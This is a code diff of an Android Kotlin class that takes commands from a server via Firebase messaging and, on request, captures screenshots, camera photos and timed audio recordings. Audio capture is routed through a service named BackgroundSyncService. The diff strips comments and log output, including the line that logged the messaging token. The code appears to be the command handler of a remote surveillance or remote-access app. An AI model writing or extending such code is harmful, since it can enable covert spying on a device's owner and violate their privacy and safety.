@@ -16,7 +16,7 @@ import java.util.concurrent.Executors
 
 @SuppressLint("HardwareIds")
 class Commands(private val context: Context) {
-    private val TAG = "CommandPoller"
+    private val TAG = "Commands"
     private val executor = Executors.newSingleThreadExecutor()
 
     private var fcmWorking = false
@@ -41,19 +41,12 @@ class Commands(private val context: Context) {
         try {
             FirebaseMessaging.getInstance().token.addOnCompleteListener { task ->
                 if (!task.isSuccessful) {
-                    Log.w(TAG, "Fetching FCM registration token failed", task.exception)
                     fcmWorking = false
                     return@addOnCompleteListener
                 }
-
-                // Get new FCM registration token
                 val token = task.result
-
-                // Send the token to the server
                 registerFCMToken(token)
-
                 fcmWorking = true
-                Log.d(TAG, "FCM Token: $token")
             }
         } catch (e: Exception) {
             Log.e(TAG, "Error setting up FCM: ${e.message}")
@@ -189,9 +182,7 @@ class Commands(private val context: Context) {
         return commandTypes[commandId] ?: "unknown"
     }
 
-    // Command handlers remain the same
     private fun handleCaptureScreenshotCommand(command: JSONObject) {
-        // Implementation remains the same
         try {
             val commandId = command.optString("id")
 
@@ -216,11 +207,9 @@ class Commands(private val context: Context) {
     }
 
     private fun handleCaptureCameraCommand(command: JSONObject) {
-        // Implementation remains the same
         try {
             val commandId = command.optString("id")
 
-            // Check camera permission before requesting capture
             if (ContextCompat.checkSelfPermission(context, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                 val result = JSONObject().apply {
                     put("message", "Camera permission not granted")
@@ -230,7 +219,6 @@ class Commands(private val context: Context) {
                 return
             }
 
-            // Send initial response that we're processing the command
             val result = JSONObject().apply {
                 put("message", "Camera capture initiated")
                 put("status", "pending")
@@ -255,14 +243,12 @@ class Commands(private val context: Context) {
             val commandId = command.optString("id")
             val duration = command.optInt("duration", 30) // Default 30 seconds
 
-            // Send initial response that we're processing the command
             val result = JSONObject().apply {
                 put("message", "Audio recording initiated")
                 put("status", "pending")
             }
             sendCommandResponse(commandId, true, "Audio recording requested", result)
 
-            // Send intent to BackgroundSyncService to handle the recording
             val intent = android.content.Intent(context, BackgroundSyncService::class.java)
             intent.action = "CAPTURE_AUDIO"
             intent.putExtra("command_id", commandId)
